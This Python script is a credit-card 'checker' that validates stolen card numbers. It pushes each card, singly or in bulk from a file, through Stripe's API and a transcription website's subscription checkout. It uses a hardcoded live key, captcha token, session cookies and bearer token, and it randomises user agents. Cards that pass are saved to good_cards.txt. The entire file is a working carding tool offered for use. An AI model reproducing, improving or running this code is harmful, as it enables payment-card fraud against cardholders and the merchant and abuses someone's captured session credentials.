import requests
import json
import time
import os
from datetime import datetime
from user_agent import generate_user_agent

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                            │
│         ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ██╗   ██╗         │
│         ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔═══██╗╚██╗ ██╔╝         │
│         ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝██║   ██║ ╚████╔╝          │
│         ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██║   ██║  ╚██╔╝           │
│         ██████╔╝██║  ██║██║  ██║██║  ██╗██████╔╝╚██████╔╝   ██║            │
│         ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝            │
│                                                        Boot Script 2.0     │
└────────────────────────────────────────────────────────────────────────────┘
"""
    print("\033[1;36m" + banner + "\033[0m")
    print("This CC Checker script is Made by @Darkboy336 Pythonista, Follow for more weekly script....\n")

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_number}')
        if response.status_code == 200:
            return response.json()
        return {}
    except:
        return {}

def format_bin_info(bin_info):
    formatted = {}
    formatted['scheme'] = bin_info.get('scheme', 'N/A').upper()
    formatted['type'] = bin_info.get('type', 'N/A').upper()
    formatted['brand'] = bin_info.get('brand', 'N/A').upper()
    formatted['bank'] = bin_info.get('bank', {}).get('name', 'N/A').upper()
    formatted['country'] = bin_info.get('country', {}).get('name', 'N/A')
    formatted['emoji'] = bin_info.get('country', {}).get('emoji', '')
    return formatted

def check_card(card_number, exp_month, exp_year, cvv):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': generate_user_agent(),
    }
    
    data = {
        'type': 'card',
        'billing_details[name]': 'Test User',
        'card[number]': card_number,
        'card[cvc]': cvv,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'guid': '37d94b84-63e3-4654-8276-751a10c76d2105d7dd',
        'muid': '83945ecf-6cde-43b8-bd7b-92659ec095b808adf3',
        'sid': '27b08ce8-4992-40e1-9f47-3012b0b4c67cdd32e9',
        'payment_user_agent': 'stripe.js/bef5cfe0f1; stripe-js-v3/bef5cfe0f1; split-card-element',
        'referrer': 'https://www.happyscribe.com',
        'time_on_page': '46116',
        'key': 'pk_live_cWpWkzb5pn3JT96pARlEkb7S',
        'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZpOPsY8RtkAg_regLe0HNLjuOL2Za7YDrXoc0jzGthmPbx2aNRqjWjTSfvlzwqV70NsLpnpg908a57cm1cSMLizVWOrIJeI1oCiwgGKjrw2gUlmVPhP5PWJYvpaJ0SrtaosOuX-82v8NDTK8dloDmmucbR8GThiy7EfojFU5LsfGEcRtWPjyjPW7Ja-4-hBq5mViQCWx3NiRwwkn1FnN3nXIo6TBkYQDUIEDFahlH0qHCxvSbUiVvHjYUpXmHkwXOTJN9Pt_WNQkzevPJip4yhlqs604O1P7xbpEqskZV1dm_OXB_k1YqlN5h_Qwg5U0JpFEeA4IGJQXgpbqRs5uoK71pW489XlZG1qHyq1YQEIJ9zG_Sycf6eeOkxUUeKyKQiAAZ2uZB2LccMoNhyl12nbLqNvSa4XGxpFtisL-6EgeZkYTi5jzxLRhQqKZQatQRniPJQFjtkZo1vgGevrx8r5k1YjFV2rQhW_1gIbaAymk8f7-82Ag-XIIVCS8-wv1JmZWn1M0LTjO81OzC9mFe2_Al6uM2yV6ktyiLXJQa9NnfQC15wKn6gMMejOzINVlXhMCMbqPV5gNuqGo-v_PHzqPSGhDwusmkTv3XsbmEr4j4ih-xATflhxleAYTUBw3yFAcLa5KHlG5pERy_7AxJJpBAA9ZZ1EAaOCEIaDMCQmfPUm6ayZR3nlwWy2Qh6w5poBxd-qpg1Hw-7qHckjs5uLVzIrsQvTWkNewKAtTpjjHV6YyWuWx4y9ZVShAfRrUPagZ_EpGmrk1uJrR-3WQIUZ6wwLC6xrFbYgcLRg0lNcNFmqdj8WVWN_qroEAN_ZhZQGCNXlxK8PE70lJS_Krsv3fFCgeatYDKo_wEy91rmLMZqjCJDnHKsVMP35E4_F9eLxuNGhwYe7GaRkGtP00XSYU0Vf5ElTbigMVHKIJ3YQWl8v5ETPFTsg0Ok8dsIwGgsvvuPuBZguJtPw6p_IQV1kHG8PS2oomyHjHb1M_rwSg-jZ2XxHTwRnUSszb6a8wwyh8JByayz1wwtcgAEn8UO5gvMc5AP5VXfnMxeKQg_yVgDMo0Li8rnb6H5XpqqexWhaTV3YvGCO6NmfrYucklu3zxOzRM4ICehdUrlIaKXX1lbtjmfDjMlfByHxrx1XXxw6c-osbTO0P2XU7CFt0gYJ90JLzVtw_ES69I8TJMXMLrDhDtyyChWZV2cGKoqvBY9QixDEQTgdtQ7ITfLJtOAqcL-GJSpa5kVKEDv923KacIovlEQ1DjjibSfewfdePCwWldb4qFeOGyNDBQveVP2XmE3AU5HoL6m-PGszj0Q6g1JL7bbBu_dg-KLYRGTOeQbq09ETZBGC_3k1yblc4D9lvfpU70fmgGJCbWuv1T_mQcjUbgZCWITaNDgEnODuv7sQqLIIioztkCvmRdyBhQI3fgQt1r7OO6A3eooiYfAm7HQ6ULD9j8EDizGnSxrskSvSxGumR5qDXPkGfH-Xnos16q2c32xrA2OLIikay7YGHaYDAy-LVjdX923eCm8d1-tWDLCaZuMs2vvDOkrf7h1du9kebg49pl4g2-LqA7uVJ5NjKPMaKMMbdroTgUt5E_9vIynlG0BbVAer04Nj_N7cM8T-RvTWMey3MoYFPN_kxpBdFjIiki5sbpdEBl8fU8KDVc5KU-AXlYQcDBEMl8MNQXwUUhc3t5KnIxP00R-Mx8Fwn-XB8kDNH4V1bWk_pEa8D2XCgGKBnIIjZSJmrMaQfj_Xjs7wN6Ffs0nF6JqOT9EuLtHoPiXYszHhwgTxH02bpUWehH3TJ1KW1jSC3QuHWMqsNT0cdLgskfz2FVD3Iq4lflvn3uVBUUTVoIDBKS52sdxEsczASUzE5fgAPf8_SrtHurj3sabbUpSRxv6NYeiPu2WW1ep7XPgB8KrSTLoJQxiQvkg55J3KdNlGqYMqrCD64pnYLjAO67PXZ32CgIZO-mDhTfnziIZpUNr3LB0Mc5bymh7dX0x0qhLuhww02TLhzZiBKSiTzomSAazHoVjegp0dlBZ_CK303DqMYnBdfhBVUUKZFTwT8YdqjFbIGm7qVTz0DJJ_NY2jZiIhzIgWsA4sbL0ZpQDzVWPLGL5Mrb6JqxS7qwm9fDgFxbKytVYZIuEKV0FewKh1ZmAXceiLSwC1fnD4G3wo92qK2_IvOUcmc6s5xado2V4cM5mfoyzqHNoYXJkX2lkzgMxg2-ia3KoM2M1OTAwMGWicGQA.tESbNIM3vSqlKTFrqbmcw8Dr8-qu1Z-gwdd2id-SHzc'
    }
    
    try:
        payment_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        payment_response_json = payment_response.json()
        
        if 'id' not in payment_response_json:
            return {'status': 'declined', 'message': 'Failed to create payment method'}
        
        payment_method_id = payment_response_json['id']
        
        cookies = {
            'timezone': 'Asia%2FBaghdad',
            'ahoy_visit': '315a68ed-1102-4a82-b2da-225a5627dbf6',
            'ahoy_visitor': '7555e3da-9899-4e95-853c-da447e0e2cc5',
            '_gcl_au': '1.1.1175269806.1719568338',
            '_gid': 'GA1.2.311117659.1719568338',
            'intercom-device-id-frdatdus': '955be6fc-9d3f-437e-84d7-184eef41a526',
            '__stripe_mid': '83945ecf-6cde-43b8-bd7b-92659ec095b808adf3',
            '__stripe_sid': '27b08ce8-4992-40e1-9f47-3012b0b4c67cdd32e9',
            '_cioid': '12337461',
            'user_id': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ik1USXpOREUyT1RjPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLnVzZXJfaWQifX0%3D--0938d7e61505fbd347066968ce4b6a5596484422',
            'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNak0wTVRZNU4xMHNJbmhwYzJWVWVVMXlZM0J6Y1VSVldFUjRlazV2SWl3aU1UY3hPVFUyT1RReU1DNDJNVE01TWpRMUlsMD0iLCJleHAiOiIyMDI0LTA3LTA1VDEwOjEwOjIwLjYxM1oiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--fb168cce19ae9084619253189af5d622e790a6ab',
            'unsecure_is_signed_in': '1',
            '_ga': 'GA1.2.1352346094.1719568337',
            'intercom-session-frdatdus': 'MnlSeHlVU3RJSWhEejhwVFNLMEw2R1ZHdER3c3Q5allPRXVpUlhwbjBDSUFoL2dJK0lXRTJxZDhoUmRSWExyYi0tcWhiQlBWd3lYRnh4RXlwZjJwSGpSUT09--87f18a65300dd2a02ae77bae00a3430af14a1fea',
            '_ga_4T8KCV9Y2D': 'GS1.1.1719568337.1.1.1719569461.23.0.0',
            '_transcribe_session': '%2BQhE%2FZH185bIPQ8a6%2Bf37ss5A9pnM%2Fs%2F%2Fp1J82Hr8TRWRuBLYeeg5yvvH2as4w%2BT2cv0TC7Q1w759DETnxmDXtvLiej%2FQKVkjaFlILaaPG37LdTpBuueYvfDUJj24NiMUC7WkrGMUVT70%2BjE7ZL%2B0Y0JwZ%2B22v7B55dwbj0QCyDRXrlxB2mpHkIzDW%2FRyOqA3YLVgyGPpLzKG1Z7xFDamNg80OAWM3IOsQZCnZ%2BatTy2kHEu3d%2FuBZJFvxaw9Ry79mYqIetDL0vVh6ZfwdFN5%2BFE5iSbtjY7YIuB58Fbx0o43kZOFnmeZHZXbg3DfH8NxIF3NT2WDbzadyy5YYqp%2BY6DIdjGXCwaDfabIFH8sfccgOQGu%2Fd8qkgVX%2FYSu2j0rMLCd92m%2B8KOSSeDdfrFxWxsbw%3D%3D--4b9%2BxTZ%2FcBFXSKZJ--e9hI5fgPoS%2FxRV1Nbus2CQ%3D%3D',
        }
        
        headers = {
            'authority': 'www.happyscribe.com',
            'accept': 'application/json',
            'authorization': 'Bearer cPk4WAI97ukY5wwY2ucQYAtt',
            'content-type': 'application/json',
            'origin': 'https://www.happyscribe.com',
            'referer': 'https://www.happyscribe.com/v2/11843946/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
            'user-agent': generate_user_agent(),
        }
        
        payment_data = {
            'id': 11523018,
            'address': 'Los Angeles',
            'name': 'Test User',
            'country': 'US',
            'vat': '10080',
            'billing_account_id': 11523018,
            'orderReference': 'nnowdiix',
            'user_id': 12341697,
            'organization_id': 11843946,
            'hours': 0,
            'balance_increase_in_cents': None,
            'payment_method_id': payment_method_id,
            'transcription_id': None,
            'plan': 'basic_2023_05_01',
            'order_id': None,
            'recurrence_interval': 'month',
            'extra_plan_hours': None,
        }
        
        payment_attempt = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=payment_data)
        payment_attempt_json = payment_attempt.json()
        
        if 'error' in payment_attempt_json:
            if "Your card has insufficient funds." in payment_attempt_json['error']:
                return {'status': 'live', 'message': 'Card has insufficient funds'}
            else:
                return {'status': 'declined', 'message': payment_attempt_json.get('error', 'Card declined')}
        elif 'requires_action' in payment_attempt_json:
            return {'status': '3d_secure', 'message': 'Card requires 3D Secure authentication'}
        else:
            return {'status': 'approved', 'message': 'Payment successful'}
            
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def process_single_card():
    while True:
        card_input = input("\n[~] Enter the cc (format: CC|MM|YY|CVV): ").strip()
        if card_input.lower() == 'back':
            return
        
        parts = card_input.split('|')
        if len(parts) != 4:
            print("Invalid format! Please use CC|MM|YY|CVV format.")
            continue
            
        card_number, exp_month, exp_year, cvv = parts
        
        if len(card_number) < 13 or len(card_number) > 19 or not card_number.isdigit():
            print("Invalid card number! Must be 13-19 digits.")
            continue
            
        if not exp_month.isdigit() or not exp_year.isdigit():
            print("Invalid expiration date! Month and year must be numbers.")
            continue
            
        if len(exp_year) == 2:  # Convert YY to YYYY
            exp_year = '20' + exp_year
            
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            print("Invalid CVV! Must be 3 or 4 digits.")
            continue
            
        start_time = time.time()
        print("\n" + "|\\|==========================================|/|")
        print("          Checking credit card(s)...")
        print("|----------------------------------------------|")
        
        result = check_card(card_number, exp_month, exp_year, cvv)
        
        if result['status'] == 'declined':
            print(f"> \033[1;31m𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ -------!\033[0m")
        elif result['status'] == 'live':
            print(f"> \033[1;33m𝐋𝐢𝐯𝐞 ✅ -------!\033[0m")
        elif result['status'] == 'approved':
            print(f"> \033[1;32m𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ -------!\033[0m")
        elif result['status'] == '3d_secure':
            print(f"> \033[1;34m𝟑𝐃 𝐒𝐞𝐜𝐮𝐫𝐞 🔒 -------!\033[0m")
            
        print(f"> {card_number}|{exp_month}|{exp_year[-2:]}|{cvv} - {result['message']}")
        
        elapsed_time = time.time() - start_time
        minutes = int(elapsed_time // 60)
        seconds = round(elapsed_time % 60, 2)
        
        print("|\\|==========================================|/|")
        print("                   SUMMARY")
        print("|\\|==========================================|/|")
        print(f"[+] Gateway: Single + Mass Stripe Auth + CCN")
        print(f"[~] Total: 1")
        
        if result['status'] == 'declined':
            print(f"[>] Declined: 1")
            print(f"[>] Hit: 0")
        elif result['status'] in ['live', 'approved', '3d_secure']:
            print(f"[>] Declined: 0")
            print(f"[>] Hit: 1")
            
        print(f"[>] CCN: 0")
        print(f"[÷] Time: {minutes} min and {seconds} sec")
        print("|\\|==========================================|/|")
        print("Thanks for using my checker!!\n")
        
        if result['status'] in ['live', 'approved', '3d_secure']:
            with open('good_cards.txt', 'a') as f:
                f.write(f"{card_number}|{exp_month}|{exp_year[-2:]}|{cvv} - {result['status']} - {result['message']}\n")
        
        input("\nPress Enter to check another card or type 'back' to return to menu...")
        clear_screen()
        print_banner()

def process_multiple_cards():
    file_path = input("\n[~] Enter the (.txt) file path with ccs: ").strip()
    if not os.path.exists(file_path):
        print("File not found!")
        return
        
    try:
        with open(file_path, 'r') as f:
            cards = [line.strip() for line in f.readlines() if line.strip()]
    except:
        print("Error reading file!")
        return
        
    print(f"Loaded {len(cards)} credit cards from the file.")
    
    start_time = time.time()
    print("\n" + "|\\|==========================================|/|")
    print("          Checking credit card(s)...")
    print("|----------------------------------------------|")
    
    total = len(cards)
    declined = 0
    hits = 0
    
    for card_input in cards:
        parts = card_input.split('|')
        if len(parts) != 4:
            continue
            
        card_number, exp_month, exp_year, cvv = parts
        
        if len(exp_year) == 2:  # Convert YY to YYYY
            exp_year = '20' + exp_year
            
        result = check_card(card_number, exp_month, exp_year, cvv)
        
        if result['status'] == 'declined':
            print(f"> \033[1;31m𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ -------!\033[0m")
            declined += 1
        elif result['status'] == 'live':
            print(f"> \033[1;33m𝐋𝐢𝐯𝐞 ✅ -------!\033[0m")
            hits += 1
        elif result['status'] == 'approved':
            print(f"> \033[1;32m𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ -------!\033[0m")
            hits += 1
        elif result['status'] == '3d_secure':
            print(f"> \033[1;34m𝟑𝐃 𝐒𝐞𝐜𝐮𝐫𝐞 🔒 -------!\033[0m")
            hits += 1
            
        print(f"> {card_number}|{exp_month}|{exp_year[-2:]}|{cvv} - {result['message']}")
        print("|----------------------------------------------|")
        
        if result['status'] in ['live', 'approved', '3d_secure']:
            with open('good_cards.txt', 'a') as f:
                f.write(f"{card_number}|{exp_month}|{exp_year[-2:]}|{cvv} - {result['status']} - {result['message']}\n")
        
        time.sleep(1)  # Add delay to avoid rate limiting
    
    elapsed_time = time.time() - start_time
    minutes = int(elapsed_time // 60)
    seconds = round(elapsed_time % 60, 2)
    
    print("|\\|==========================================|/|")
    print("                   SUMMARY")
    print("|\\|==========================================|/|")
    print(f"[+] Gateway: Single + Mass Stripe Auth + CCN")
    print(f"[~] Total: {total}")
    print(f"[>] Declined: {declined}")
    print(f"[>] Hit: {hits}")
    print(f"[>] CCN: 0")
    print(f"[÷] Time: {minutes} min and {seconds} sec")
    print("|\\|==========================================|/|")
    print("Thanks for using my checker!!\n")
    input("\nPress Enter to return to menu...")

def main():
    clear_screen()
    print_banner()
    
    while True:
        print("[+] Do you want to check:")
        print("[∞] 1. Single credit card")
        print("[∞] 2. Multiple credit cards")
        print("[∞] 3. Exit")
        
        choice = input("[+] Enter 1, 2 OR 3: ").strip()
        
        if choice == '1':
            clear_screen()
            print_banner()
            process_single_card()
            clear_screen()
            print_banner()
        elif choice == '2':
            clear_screen()
            print_banner()
            process_multiple_cards()
            clear_screen()
            print_banner()
        elif choice == '3':
            print("\nExiting program...")
            break
        else:
            print("Invalid choice! Please enter 1, 2 or 3.")

if __name__ == "__main__":
    main()
